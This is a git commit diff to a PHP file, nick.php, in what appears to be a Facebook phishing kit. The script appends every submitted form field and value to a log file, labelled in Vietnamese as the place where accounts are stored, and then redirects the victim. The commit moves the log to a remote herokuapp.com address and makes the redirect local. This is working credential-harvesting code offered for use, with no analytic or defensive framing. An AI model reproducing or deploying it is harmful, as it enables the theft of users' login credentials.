7008723202da0479b9d7c115b4bfbf9941bc0912
okeynhat <okeynhat@users.noreply.github.com>
2020-01-31 14:27:03 +0700

    Update nick.php

--- web/fb/nick.php
+++ web/fb/nick.php
@@ -1,6 +1,6 @@
 <?php
-header("Location: https://mdtiot.herokuapp.com/fb/ngu.php "); //nhập link các bạn muốn chuyển đến 
-$handle = fopen("log.txt", "a");//nơi lưu tài khoản
+header("Location: ngu.php "); //nhập link các bạn muốn chuyển đến 
+$handle = fopen("https://mdtiot.herokuapp.com/fb/log.txt", "a");//nơi lưu tài khoản
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
